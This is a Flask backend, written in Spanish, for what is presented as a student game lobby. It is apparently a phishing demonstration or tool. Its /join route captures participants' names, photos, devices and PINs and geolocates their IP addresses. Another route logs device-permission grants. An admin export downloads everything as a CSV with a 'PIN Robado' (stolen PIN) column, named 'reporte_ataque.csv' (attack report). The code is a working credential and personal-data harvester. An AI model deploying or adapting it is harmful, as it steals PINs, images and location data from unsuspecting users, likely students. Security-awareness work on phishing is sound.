from flask import Blueprint, request, render_template, jsonify, Response, redirect, url_for
from .database import guardar_permiso, obtener_permisos, registrar_estudiante, obtener_estudiantes, iniciar_juego, estado_juego, reiniciar_juego
import json
import time

main_bp = Blueprint('main', __name__)

@main_bp.route('/')
def inicio():
    return render_template('index.html')

@main_bp.route('/join', methods=['POST'])
def join():
    import urllib.request
    datos = request.get_json()
    nombre = datos.get('nombre', 'Anónimo')
    foto = datos.get('foto', '')
    dispositivo = datos.get('dispositivo', 'Desconocido')
    pin = datos.get('pin', '')
    
    # Manejar IP en Vercel o local
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()
        
    ip_info = ip
    if ip and ip not in ['127.0.0.1', '::1', 'localhost']:
        try:
            req = urllib.request.Request(f"http://ip-api.com/json/{ip}", headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as url:
                geo = json.loads(url.read().decode())
                if geo.get("status") == "success":
                    ip_info = f"{geo.get('city', '')}, {geo.get('country', '')} ({ip})"
        except Exception as e:
            pass

    registrar_estudiante(nombre, foto, dispositivo, pin, ip_info)
    return jsonify({"status": "ok"})

@main_bp.route('/espera')
def espera():
    nombre = request.args.get('nombre', 'Anónimo')
    return render_template('espera.html', nombre=nombre)

@main_bp.route('/admin')
def admin():
    return render_template('admin.html')

@main_bp.route('/admin/start', methods=['POST'])
def admin_start():
    iniciar_juego()
    return jsonify({"status": "ok"})

@main_bp.route('/admin/reset', methods=['POST'])
def admin_reset():
    reiniciar_juego()
    return jsonify({"status": "ok"})

@main_bp.route('/log_permiso', methods=['POST'])
def log_permiso():
    datos = request.get_json()
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    nombre = datos.get('nombre', 'Anónimo')
    tipo = datos.get('tipo', 'Desconocido')
    estado = datos.get('estado', 'Desconocido')
    detalle = datos.get('detalle', '')
    
    guardar_permiso(nombre, ip, user_agent, tipo, estado, detalle)
    return jsonify({"status": "ok"})

@main_bp.route('/admin/export')
def admin_export():
    import csv
    from io import StringIO
    si = StringIO()
    cw = csv.writer(si)
    cw.writerow(['Nombre', 'Dispositivo', 'PIN Robado', 'Ubicacion IP'])
    for est in obtener_estudiantes():
        cw.writerow([est['nombre'], est['dispositivo'], est.get('pin', ''), est.get('ip_info', '')])
    
    cw.writerow([])
    cw.writerow(['Nombre', 'Permiso Solicitado', 'Estado', 'Detalle'])
    for log in obtener_permisos():
        cw.writerow([log['nombre'], log['tipo'], log['estado'], log['detalle']])
        
    return Response(si.getvalue(), mimetype="text/csv", headers={"Content-disposition":"attachment; filename=reporte_ataque.csv"})

@main_bp.route('/api/stream_lobby')
def api_stream_lobby():
    def event_stream():
        last_version = -1
        while True:
            time.sleep(1)
            current_version = estado_juego["version"]
            if current_version > last_version:
                last_version = current_version
                datos = {
                    "iniciado": estado_juego["iniciado"],
                    "estudiantes": obtener_estudiantes()
                }
                yield f"data: {json.dumps(datos)}\n\n"
    return Response(event_stream(), mimetype="text/event-stream")

@main_bp.route('/api/stream_logs')
def api_stream_logs():
    def event_stream():
        last_version = -1
        while True:
            time.sleep(1)
            current_version = estado_juego["logs_version"]
            if current_version > last_version:
                last_version = current_version
                yield f"data: {json.dumps(obtener_permisos())}\n\n"
    return Response(event_stream(), mimetype="text/event-stream")
